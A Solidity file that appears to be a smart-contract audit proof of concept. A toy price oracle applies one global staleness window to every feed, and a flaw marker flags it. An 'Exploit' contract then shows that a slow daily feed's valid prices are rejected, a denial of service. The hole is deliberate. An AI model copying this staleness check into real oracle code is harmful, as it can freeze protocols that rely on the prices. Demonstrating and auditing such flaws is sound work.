// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract PriceOracle {
    struct Feed {
        uint256 price;
        uint256 updatedAt;
        uint256 heartbeat;
    }

    uint256 public staleness;
    mapping(address => Feed) public feeds;

    function initialize(uint256 globalStaleness) external {
        staleness = globalStaleness;
    }

    function setFeed(address asset, uint256 price, uint256 updatedAt, uint256 heartbeat) external {
        feeds[asset] = Feed(price, updatedAt, heartbeat);
    }

    function getPrice(address asset, uint256 nowTs) external view returns (uint256) {
        Feed memory f = feeds[asset];
        // @> VULN: all assets share one staleness period, ignoring feed heartbeat.
        require(nowTs - f.updatedAt <= staleness, "stale price");
        return f.price;
    }
}

contract Exploit {
    PriceOracle public oracle;
    address public constant SLOW_ASSET = address(0xBEEF);
    bool public staleFeedDos;
    bool public heartbeatWouldAccept;

    constructor() {
        oracle = new PriceOracle();
    }

    function run() external {
        oracle.initialize(3_600); // deployment uses the ETH/USD one-hour heartbeat
        oracle.setFeed(SLOW_ASSET, 1_000e8, 95_000, 86_400); // USDC-like daily feed
        (bool ok,) = address(oracle).staticcall(
            abi.encodeWithSelector(PriceOracle.getPrice.selector, SLOW_ASSET, 100_000)
        );
        staleFeedDos = !ok;
        (,, uint256 heartbeat) = oracle.feeds(SLOW_ASSET);
        heartbeatWouldAccept = 100_000 - 95_000 <= heartbeat;
        require(staleFeedDos && heartbeatWouldAccept, "oracle did not demonstrate false staleness");
    }
}
